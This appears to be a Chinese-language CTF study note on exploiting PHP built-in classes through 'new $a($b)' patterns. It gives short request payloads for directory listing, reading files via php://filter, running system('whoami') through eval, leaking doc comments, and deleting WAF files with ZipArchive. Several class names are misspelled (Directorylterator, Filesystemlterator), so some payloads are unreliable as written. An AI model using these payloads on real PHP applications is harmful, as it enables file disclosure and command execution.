---
title: PHP原生类
date: 2025-03-27 21:39:53
tags:
- PHP原生类
category:
- 学习笔记
---

# PHP原生类

参考链接：https://xz.aliyun.com/news/13225

原地址[PHP反序列化原生类利用](https://blog.csdn.net/weixin_54902210/article/details/124689580)

php中内置很多原生的类，在CTF中常以`echo new $a($b);`这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。

## 目录遍历类

### DirectoryIterator

这个类会创建一个指定目录的迭代器，当遇到`echo`输出时会触发`Directorylterator`中的`__toString()`方法，输出指定目录里面经过排序之后的第一个文件名。

可以结合glob协议使用

例如：

```
?a=Directorylterator&b=glob://f*
```

### FilesystemIterator

该类继承于`Directorylterator`，所以在用法上基本也是一样的。

```
?a=Filesystemlterator&b=glob://f*
```

### GlobIterator

这个类自带`glob`协议，调用时不需要再加上`glob://`

```
?a=Globlterator&b=f*
```

---

## 文件读取类 

### SplFileObject

当我们遍历到了敏感文件时，可以用SplFileObject类读取文件，同样通过echo触发`SplFileObject`中的`__toString()`方法。

但是该类不支持通配符，必须先获取到完整的文件名才能读取

```
?a=SplFileObject&b=flag
```

并且`SplFileObject`类，只能读取文件的第一行内容，如果要全部读取需要用到foreach函数，也可以使用伪协议读取文件中的内容。

一般都是使用伪协议

```
?a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag
```

如果题目是echo new$a($b)->$c()这种类型

可以主动调用__toString方法

```
?a=SplFileObject&b=php://filter/read=convert.base64-encode/resource=flag&c=__toString
```

## 报错类

### Error和Exception

### 命令执行

若代码是这种有eval的形式，则可以进行命令执行

```
<?php
$a = $_GET['a'];
$b = $_GET['b'];
eval("echo new $a($b());");
?>
```

```
?a=Error&b=system('whoami')
```

这里就不仅限于Error和Exception了，基本上所有的原生类都可以

---

## 其他类

### ReflectionMethod 获取类方法的相关信息

可以结合`getDocComment()` 方法，用它来获取类中各个函数注释内容

```
<?php
class Sentiment{
    /** flag{asdasd} */
    public function a(){
    }
}
$a = $_GET['a'];
$b = $_GET['b'];
$c= $_GET['c'];
$d=new $a($b,$c);
var_dump($d->getDocComment());
?>
```

---

### ZipArchive 文件操作

可以通过本类执行一些文件操作，在CTF可以用来删除waf

```
ZipArchive::addEmptyDir：添加一个新的文件目录
ZipArchive::addFile：将文件添加到指定zip压缩包中
ZipArchive::addFromString：添加新的文件同时将内容添加进去
ZipArchive::close：关闭ziparchive
ZipArchive::extractTo：将压缩包解压
ZipArchive::open：打开一个zip压缩包
ZipArchive::deleteIndex：删除压缩包中的某一个文件，如：deleteIndex(0)代表删除第一个文件
ZipArchive::deleteName：删除压缩包中的某一个文件名称，同时也将文件删除

```

例如

```
<?php
$zip = new ZipArchive;
$zip->open('web.zip', ZipArchive::CREATE)
?>

```

第一个参数：要打开的压缩包文件

第二个参数：

```
ZIPARCHIVE::OVERWRITE总是创建一个新的文件，如果指定的zip文件存在，则会覆盖掉。

ZIPARCHIVE::CREATE如果指定的zip文件不存在，则新建一个。

ZIPARCHIVE::EXCL如果指定的zip文件存在，则会报错。

ZIPARCHIVE::CHECKCONS对指定的zip执行其他一致性测试。
```


之后会在当前目录创建个web.zip，但可能由于环境原因没有打出来

